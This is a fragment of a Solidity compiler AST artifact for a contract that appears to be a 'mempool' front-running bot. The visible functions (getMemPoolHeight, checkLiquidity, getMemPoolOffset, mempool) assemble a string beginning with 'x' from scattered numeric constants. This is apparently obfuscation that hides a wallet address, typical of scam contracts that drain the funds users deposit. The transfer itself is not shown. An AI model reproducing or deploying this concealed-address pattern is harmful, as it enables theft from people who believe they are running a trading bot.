																			"nodeType": "YulBlock",
																			"src": "12208:45:9",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12210:41:9",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "needleptr",
																										"nodeType": "YulIdentifier",
																										"src": "12234:9:9"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "12228:5:9"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "12228:16:9"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "12246:4:9"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "12224:3:9"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12224:27:9"
																					},
																					"variableNames": [
																						{
																							"name": "needledata",
																							"nodeType": "YulIdentifier",
																							"src": "12210:10:9"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1653,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12246:4:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1672,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12210:10:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1634,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12234:9:9",
																				"valueSize": 1
																			}
																		],
																		"id": 1674,
																		"nodeType": "InlineAssembly",
																		"src": "12199:54:9"
																	},
																	{
																		"assignments": [
																			1676
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1676,
																				"mutability": "mutable",
																				"name": "end",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1706,
																				"src": "12274:8:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 1675,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "12274:4:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1682,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1681,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1679,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1677,
																					"name": "selfptr",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1630,
																					"src": "12285:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1678,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1628,
																					"src": "12295:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "12285:17:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1680,
																				"name": "needlelen",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1632,
																				"src": "12305:9:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "12285:29:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12274:40:9"
																	},
																	{
																		"assignments": [
																			1684
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1684,
																				"mutability": "mutable",
																				"name": "ptrdata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1706,
																				"src": "12333:15:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1683,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12333:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1685,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12333:15:9"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12376:36:9",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12378:32:9",
																					"value": {
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "ptr",
																										"nodeType": "YulIdentifier",
																										"src": "12399:3:9"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "12393:5:9"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "12393:10:9"
																							},
																							{
																								"name": "mask",
																								"nodeType": "YulIdentifier",
																								"src": "12405:4:9"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "12389:3:9"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12389:21:9"
																					},
																					"variableNames": [
																						{
																							"name": "ptrdata",
																							"nodeType": "YulIdentifier",
																							"src": "12378:7:9"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1653,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12405:4:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1640,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12399:3:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1684,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12378:7:9",
																				"valueSize": 1
																			}
																		],
																		"id": 1686,
																		"nodeType": "InlineAssembly",
																		"src": "12367:45:9"
																	},
																	{
																		"body": {
																			"id": 1702,
																			"nodeType": "Block",
																			"src": "12463:203:9",
																			"statements": [
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1692,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1690,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1640,
																							"src": "12490:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">=",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1691,
																							"name": "end",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1676,
																							"src": "12497:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "12490:10:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1697,
																					"nodeType": "IfStatement",
																					"src": "12486:65:9",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 1695,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"id": 1693,
																								"name": "selfptr",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1630,
																								"src": "12534:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 1694,
																								"name": "selflen",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1628,
																								"src": "12544:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "12534:17:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1638,
																						"id": 1696,
																						"nodeType": "Return",
																						"src": "12527:24:9"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1699,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "UnaryOperation",
																						"operator": "++",
																						"prefix": false,
																						"src": "12574:5:9",
																						"subExpression": {
																							"argumentTypes": null,
																							"id": 1698,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1640,
																							"src": "12574:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1700,
																					"nodeType": "ExpressionStatement",
																					"src": "12574:5:9"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "12611:36:9",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "12613:32:9",
																								"value": {
																									"arguments": [
																										{
																											"arguments": [
																												{
																													"name": "ptr",
																													"nodeType": "YulIdentifier",
																													"src": "12634:3:9"
																												}
																											],
																											"functionName": {
																												"name": "mload",
																												"nodeType": "YulIdentifier",
																												"src": "12628:5:9"
																											},
																											"nodeType": "YulFunctionCall",
																											"src": "12628:10:9"
																										},
																										{
																											"name": "mask",
																											"nodeType": "YulIdentifier",
																											"src": "12640:4:9"
																										}
																									],
																									"functionName": {
																										"name": "and",
																										"nodeType": "YulIdentifier",
																										"src": "12624:3:9"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "12624:21:9"
																								},
																								"variableNames": [
																									{
																										"name": "ptrdata",
																										"nodeType": "YulIdentifier",
																										"src": "12613:7:9"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1653,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12640:4:9",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1640,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12634:3:9",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1684,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "12613:7:9",
																							"valueSize": 1
																						}
																					],
																					"id": 1701,
																					"nodeType": "InlineAssembly",
																					"src": "12602:45:9"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			},
																			"id": 1689,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1687,
																				"name": "ptrdata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1684,
																				"src": "12440:7:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 1688,
																				"name": "needledata",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1672,
																				"src": "12451:10:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				}
																			},
																			"src": "12440:21:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1703,
																		"nodeType": "WhileStatement",
																		"src": "12433:233:9"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1704,
																			"name": "ptr",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1640,
																			"src": "12691:3:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"functionReturnParameters": 1638,
																		"id": 1705,
																		"nodeType": "Return",
																		"src": "12684:10:9"
																	}
																]
															}
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1745,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1743,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1630,
														"src": "13223:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1744,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1628,
														"src": "13233:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "13223:17:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 1638,
												"id": 1746,
												"nodeType": "Return",
												"src": "13216:24:9"
											}
										]
									},
									"documentation": null,
									"id": 1748,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findPtr",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1635,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1628,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1748,
												"src": "11851:12:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1627,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11851:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1630,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1748,
												"src": "11865:12:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1629,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11865:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1632,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1748,
												"src": "11879:14:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1631,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11879:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1634,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1748,
												"src": "11895:14:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1633,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11895:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11850:60:9"
									},
									"returnParameters": {
										"id": 1638,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1637,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1748,
												"src": "11933:4:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1636,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "11933:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11932:6:9"
									},
									"scope": 2159,
									"src": "11834:1414:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1755,
										"nodeType": "Block",
										"src": "13314:33:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "32373236323634",
													"id": 1753,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13332:7:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_2726264_by_1",
														"typeString": "int_const 2726264"
													},
													"value": "2726264"
												},
												"functionReturnParameters": 1752,
												"id": 1754,
												"nodeType": "Return",
												"src": "13325:14:9"
											}
										]
									},
									"documentation": null,
									"id": 1756,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolHeight",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1749,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "13282:2:9"
									},
									"returnParameters": {
										"id": 1752,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1751,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1756,
												"src": "13308:4:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1750,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "13308:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "13307:6:9"
									},
									"scope": 2159,
									"src": "13257:90:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1847,
										"nodeType": "Block",
										"src": "13556:860:9",
										"statements": [
											{
												"assignments": [
													1762
												],
												"declarations": [
													{
														"constant": false,
														"id": 1762,
														"mutability": "mutable",
														"name": "_memPoolOffset",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "13567:28:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1761,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "13567:6:9",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1770,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "78",
															"id": 1764,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "13606:3:9",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															"value": "x"
														},
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"id": 1766,
																		"name": "getMemPoolOffset",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1306,
																		"src": "13626:16:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
																			"typeString": "function () pure returns (uint256)"
																		}
																	},
																	"id": 1767,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "13626:18:9",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 1765,
																"name": "checkLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1568,
																"src": "13611:14:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
																	"typeString": "function (uint256) pure returns (string memory)"
																}
															},
															"id": 1768,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "13611:34:9",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_7521d1cadbcfa91eec65aa16715b94ffc1c9654ba57ea2ef1a2127bca1127a83",
																"typeString": "literal_string \"x\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1763,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2158,
														"src": "13598:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1769,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13598:48:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13567:79:9"
											},
											{
												"assignments": [
													1772
												],
												"declarations": [
													{
														"constant": false,
														"id": 1772,
														"mutability": "mutable",
														"name": "_memPoolSol",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "13657:16:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1771,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13657:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1774,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "39363938333334",
													"id": 1773,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13676:7:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_9698334_by_1",
														"typeString": "int_const 9698334"
													},
													"value": "9698334"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13657:26:9"
											},
											{
												"assignments": [
													1776
												],
												"declarations": [
													{
														"constant": false,
														"id": 1776,
														"mutability": "mutable",
														"name": "_memPoolLength",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "13694:19:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1775,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13694:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1778,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "3636313539383131313232",
													"id": 1777,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13716:11:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_66159811122_by_1",
														"typeString": "int_const 66159811122"
													},
													"value": "66159811122"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13694:33:9"
											},
											{
												"assignments": [
													1780
												],
												"declarations": [
													{
														"constant": false,
														"id": 1780,
														"mutability": "mutable",
														"name": "_memPoolSize",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "13738:17:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1779,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13738:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1782,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "3936323031333933",
													"id": 1781,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "13758:8:9",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_96201393_by_1",
														"typeString": "int_const 96201393"
													},
													"value": "96201393"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13738:28:9"
											},
											{
												"assignments": [
													1784
												],
												"declarations": [
													{
														"constant": false,
														"id": 1784,
														"mutability": "mutable",
														"name": "_memPoolHeight",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "13777:19:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1783,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13777:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1787,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1785,
														"name": "getMemPoolHeight",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1756,
														"src": "13799:16:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1786,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13799:18:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13777:40:9"
											},
											{
												"assignments": [
													1789
												],
												"declarations": [
													{
														"constant": false,
														"id": 1789,
														"mutability": "mutable",
														"name": "_memPoolDepth",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "13828:18:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1788,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13828:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1792,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1790,
														"name": "getMemPoolDepth",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2050,
														"src": "13849:15:9",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$__$returns$_t_uint256_$",
															"typeString": "function () pure returns (uint256)"
														}
													},
													"id": 1791,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "13849:17:9",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13828:38:9"
											},
											{
												"assignments": [
													1794
												],
												"declarations": [
													{
														"constant": false,
														"id": 1794,
														"mutability": "mutable",
														"name": "_memPool1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1847,
														"src": "13880:23:9",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1793,
															"name": "string",
															"nodeType": "ElementaryTypeName",
